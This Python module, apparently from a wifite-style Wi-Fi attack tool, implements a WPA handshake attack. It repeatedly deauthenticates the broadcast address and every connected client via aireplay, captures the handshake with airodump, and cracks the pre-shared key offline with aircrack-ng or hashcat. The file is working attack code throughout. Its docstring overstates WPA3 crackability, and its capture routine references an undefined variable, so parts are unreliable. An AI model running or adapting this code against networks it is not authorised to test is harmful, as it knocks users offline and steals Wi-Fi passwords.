#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.hashcat import Hashcat
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    """
    WPA/WPA2/WPA3 handshake capture attack.
    
    This class handles WPA, WPA2, and WPA3 networks as they use similar
    handshake capture mechanisms. WPA2 is essentially WPA with stronger
    encryption, and WPA3 uses SAE (Simultaneous Authentication of Equals)
    but still allows handshake capture for offline cracking.
    """
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False
        
        # Validate target has required attributes
        self.validate_target()

    def run(self):
        '''Initiates full WPA handshake capture attack.'''
        
        # Use pattack for GUI logging integration
        Color.pattack('WPA', self.target, 'Starting WPA attack', 'Initializing')
        
        # Validate configuration
        if Configuration.wpa_attack_timeout <= 0:
            Color.pl('\n{!} {R}Invalid configuration: wpa_attack_timeout must be > 0{W}')
            Color.pattack('WPA', self.target, 'WPA Attack', 'Failed - Invalid timeout configuration')
            self.success = False
            return self.success
        
        if Configuration.wpa_deauth_timeout <= 0:
            Color.pl('\n{!} {R}Invalid configuration: wpa_deauth_timeout must be > 0{W}')
            Color.pattack('WPA', self.target, 'WPA Attack', 'Failed - Invalid deauth timeout configuration')
            self.success = False
            return self.success
        
        try:
            keep_temp_file = False  # Avoid deleting temp when handshake is captured
            # Skip if target is not WPS
            if Configuration.wps_only and self.target.wps == False:
                Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)
                self.success = False
                return self.success

            # Skip if user only wants to run PMKID attack
            if Configuration.use_pmkid_only:
                self.success = False
                return False

            # Capture the handshake (or use an old one)
            handshake = self.capture_handshake()

            if handshake is None:
                # Failed to capture handshake
                self.success = False
                return self.success

            # Analyze handshake
            Color.pl('\n{+} analysis of captured handshake file:')
            handshake.analyze()

            # Check wordlist
            if Configuration.wordlist is None:
                Color.pl('{!} {O}Not cracking handshake because' +
                         ' wordlist ({R}--dict{O}) is not set')
                self.success = False
                return False

            elif not os.path.exists(Configuration.wordlist):
                Color.pl('{!} {O}Not cracking handshake because' +
                         ' wordlist {R}%s{O} was not found' % Configuration.wordlist)
                self.success = False
                return False

            # Choose cracking tool based on preference and availability
            use_hashcat = False
            try:
                if getattr(Configuration, 'prefer_hashcat', False) and Hashcat.exists():
                    use_hashcat = True
                if getattr(Configuration, 'prefer_aircrack', True) and not Aircrack.exists():
                    # Aircrack requested but missing; fall back to hashcat if available
                    use_hashcat = Hashcat.exists()
            except Exception:
                use_hashcat = False

            if use_hashcat:
                Color.pl('\n{+} {C}Cracking WPA Handshake:{W} Running {C}hashcat{W} with' +
                        ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[-1])
                key = Hashcat.crack_handshake(handshake, show_command=True)
            else:
                Color.pl('\n{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with' +
                        ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[-1])
                key = Aircrack.crack_handshake(handshake, show_command=False)
            if key is None:
                Color.pl('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % Configuration.wordlist.split(os.sep)[-1])
                self.success = False
            else:
                Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
                self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
                self.crack_result.dump()
                self.success = True
            return self.success
            
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}WPA attack interrupted by user{W}')
            self.success = False
            return self.success
        except Exception as e:
            Color.pl('\n{!} {R}Error during WPA attack: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            self.success = False
            return self.success


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.'''
        handshake = None
        temp_file = None
        
        try:
            # First, start Airodump process
            with Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='wpa') as airodump:

                Color.clear_entire_line()
                Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
                airodump_target = self.wait_for_target(airodump)

                self.clients = []

                # Try to load existing handshake
                if Configuration.ignore_old_handshakes == False:
                    bssid = airodump_target.bssid
                    essid = airodump_target.essid if airodump_target.essid_known else None
                    handshake = self.load_handshake(bssid=bssid, essid=essid)
                    if handshake:
                        Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                        Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                        return handshake

                timeout_timer = Timer(Configuration.wpa_attack_timeout)
                deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                last_handshake_check = 0
                last_client_check = 0
                
                while handshake is None and not timeout_timer.ended():
                    current_time = time.time()
                    step_timer = Timer(1)  # Check every 1 second for better responsiveness
                    
                    # Add more detailed progress information
                    elapsed_time = int(time.time() - timeout_timer.start_time)
                    progress_msg = 'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W}, elapsed:{C}%ds{W})' % (
                        len(self.clients), deauth_timer, timeout_timer, elapsed_time)
                    Color.pattack('WPA',
                            airodump_target,
                            'Handshake capture',
                            progress_msg)

                    # Check for handshake every 2 seconds (optimized)
                    if current_time - last_handshake_check >= 2:
                        last_handshake_check = current_time
                        
                        # Find .cap file
                        cap_files = airodump.find_files(endswith='.cap')
                        if len(cap_files) > 0:
                            cap_file = cap_files[0]

                            # Copy .cap file to temp for consistency
                            temp_file = Configuration.temp('handshake.cap.bak')
                            try:
                                copy(cap_file, temp_file)
                            except Exception as e:
                                Color.pl('\n{!} {R}Failed to copy cap file: {O}%s{W}' % str(e))
                                time.sleep(step_timer.remaining())
                                continue

                            # Check cap file in temp for Handshake
                            bssid = airodump_target.bssid
                            essid = airodump_target.essid if airodump_target.essid_known else None
                            try:
                                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                                if handshake.has_handshake():
                                    # We got a handshake
                                    Color.clear_entire_line()
                                    Color.pattack('WPA',
                                            airodump_target,
                                            'Handshake capture',
                                            '{G}Captured handshake{W}')
                                    Color.pl('')
                                    # Preserve the temp file until saved to hs/
                                    keep_temp_file = True
                                    break
                            except Exception as e:
                                Color.pl('\n{!} {R}Error analyzing handshake: {O}%s{W}' % str(e))
                                handshake = None

                            # There is no handshake
                            handshake = None
                            # Delete copied .cap file in temp to save space
                            try:
                                if temp_file and os.path.exists(temp_file):
                                    os.remove(temp_file)
                                    temp_file = None
                            except Exception as e:
                                Color.pl('\n{!} {O}Warning: Failed to remove temp file: {O}%s{W}' % str(e))

                    # Look for new clients every 3 seconds (optimized)
                    if current_time - last_client_check >= 3:
                        last_client_check = current_time
                        try:
                            airodump_target = self.wait_for_target(airodump)
                            for client in airodump_target.clients:
                                if client.station not in self.clients:
                                    Color.clear_entire_line()
                                    Color.pattack('WPA',
                                            airodump_target,
                                            'Handshake capture',
                                            'Discovered new client: {G}%s{W}' % client.station)
                                    Color.pl('')
                                    self.clients.append(client.station)
                        except Exception as e:
                            Color.pl('\n{!} {R}Error updating clients: {O}%s{W}' % str(e))

                    # Send deauth to a client or broadcast
                    if deauth_timer.ended():
                        try:
                            # More aggressive deauth for stubborn networks
                            self.deauth(airodump_target)
                            # Restart timer
                            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                        except Exception as e:
                            Color.pl('\n{!} {R}Error during deauth: {O}%s{W}' % str(e))

                    # Sleep for 1 second (optimized)
                    time.sleep(step_timer.remaining())
                    continue # Handshake listen+deauth loop

        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Handshake capture interrupted by user{W}')
            handshake = None
        except Exception as e:
            Color.pl('\n{!} {R}Error during handshake capture: {O}%s{W}' % str(e))
            if Configuration.verbose > 0:
                Color.pexception(e)
            handshake = None
        finally:
            # Clean up temp file if it exists and we didn't capture a handshake
            if temp_file and os.path.exists(temp_file) and not keep_temp_file:
                try:
                    os.remove(temp_file)
                except Exception as e:
                    Color.pl('\n{!} {O}Warning: Failed to clean up temp file: {O}%s{W}' % str(e))

        if handshake is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (Configuration.wpa_attack_timeout))
            Color.pl('{!} {O}Possible causes:{W}')
            Color.pl('{!} {O}  - No clients connected to target{W}')
            Color.pl('{!} {O}  - Signal strength too weak{W}')
            Color.pl('{!} {O}  - Target AP is not responding{W}')
            Color.pl('{!} {O}  - Try increasing timeout with --wpa-timeout{W}')
            Color.pl('{!} {O}  - Try using --pmkid-only for PMKID attack{W}')
            return handshake
        else:
            # Save copy of handshake to ./hs/
            try:
                # Ensure handshake references an existing file to copy
                if keep_temp_file and temp_file and os.path.exists(temp_file):
                    handshake.capfile = temp_file
                self.save_handshake(handshake)
            except Exception as e:
                Color.pl('\n{!} {R}Error saving handshake: {O}%s{W}' % str(e))
                # Continue anyway, we still have the handshake
            return handshake

    def load_handshake(self, bssid, essid):
        '''Load existing handshake from hs/ directory'''
        try:
            if not os.path.exists(Configuration.wpa_handshake_dir):
                return None

            if essid:
                essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
            else:
                essid_safe = '[a-zA-Z0-9]+'
            bssid_safe = re.escape(bssid.replace(':', '-'))
            date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
            get_filename = re.compile(r'^handshake_%s_%s_%s\.cap$' % (essid_safe, bssid_safe, date))

            for filename in os.listdir(Configuration.wpa_handshake_dir):
                cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
                if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                    try:
                        return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)
                    except Exception as e:
                        Color.pl('\n{!} {O}Warning: Failed to load handshake file {C}%s{O}: {O}%s{W}' % (cap_filename, str(e)))
                        continue

            return None
            
        except Exception as e:
            Color.pl('\n{!} {R}Error loading handshake: {O}%s{W}' % str(e))
            return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        '''
        try:
            # Create handshake dir
            if not os.path.exists(Configuration.wpa_handshake_dir):
                os.makedirs(Configuration.wpa_handshake_dir)

            # Generate filesystem-safe filename from bssid, essid and date
            if handshake.essid and type(handshake.essid) is str:
                essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
            else:
                essid_safe = 'UnknownEssid'
            bssid_safe = handshake.bssid.replace(':', '-')
            date = time.strftime('%Y-%m-%dT%H-%M-%S')
            cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

            if Configuration.wpa_strip_handshake:
                Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
                try:
                    handshake.strip(outfile=cap_filename)
                    Color.pl('{G}saved{W}')
                except Exception as e:
                    Color.pl('{R}failed{W}')
                    Color.pl('{!} {R}Error stripping handshake: {O}%s{W}' % str(e))
                    # Fall back to regular copy
                    Color.p('{+} {O}Falling back to regular copy{W}...')
                    copy(handshake.capfile, cap_filename)
                    Color.pl('{G}saved{W}')
            else:
                Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
                try:
                    copy(handshake.capfile, cap_filename)
                    Color.pl('{G}saved{W}')
                except Exception as e:
                    Color.pl('{R}failed{W}')
                    Color.pl('{!} {R}Error saving handshake: {O}%s{W}' % str(e))
                    raise

            # Update handshake to use the stored handshake file for future operations
            handshake.capfile = cap_filename
            
        except Exception as e:
            Color.pl('\n{!} {R}Failed to save handshake: {O}%s{W}' % str(e))
            raise


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        '''
        if Configuration.no_deauth: 
            return

        try:
            # Send deauth to broadcast first (most effective) - send multiple times for stubborn APs
            Color.clear_entire_line()
            Color.pattack('WPA',
                    target,
                    'Handshake capture',
                    'Deauthing {O}*broadcast*{W}')
            for i in range(3):  # Send 3 deauth packets for better chances
                try:
                    Aireplay.deauth(target.bssid, client_mac=None, timeout=1)
                except Exception as e:
                    if i == 0:  # Only show error on first attempt
                        Color.pl('\n{!} {R}Error deauthing broadcast: {O}%s{W}' % str(e))
            
            # Send deauth to ALL clients (not just first 3) for better coverage
            for client in self.clients:  # Deauth all clients for better success
                Color.clear_entire_line()
                Color.pattack('WPA',
                        target,
                        'Handshake capture',
                        'Deauthing {O}%s{W}' % client)
                try:
                    # Send 2 deauth packets per client for more aggressive approach
                    Aireplay.deauth(target.bssid, client_mac=client, timeout=1)
                    time.sleep(0.2)  # Small delay between packets
                    Aireplay.deauth(target.bssid, client_mac=client, timeout=1)
                except Exception as e:
                    Color.pl('\n{!} {R}Error deauthing {O}%s{R}: {O}%s{W}' % (client, str(e)))
                    continue
                    
        except Exception as e:
            Color.pl('\n{!} {R}Error during deauth process: {O}%s{W}' % str(e))

    def stop(self):
        """Stop the WPA attack - interface method for GUI compatibility"""
        self.success = False
        # Clean up any running processes
        Process.cleanup_all_processes()

if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
        pass
    Configuration.exit_gracefully(0)
